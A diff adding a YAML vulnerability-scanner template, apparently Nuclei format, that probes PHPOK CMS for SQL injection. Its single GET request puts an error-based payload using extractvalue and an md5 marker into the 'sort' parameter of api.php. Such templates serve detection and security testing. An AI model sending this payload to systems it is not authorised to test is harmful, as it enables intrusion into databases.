@@ -1,0 +1,13 @@
+id: yaml-poc-phpok-phpok_cms-sql_injection-CT-158158
+info:
+  name: Yaml Poc Phpok Phpok_Cms Sql_Injection Ct 158158
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-phpok-phpok_cms-sql_injection-CT-158158'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}})))
+    --+
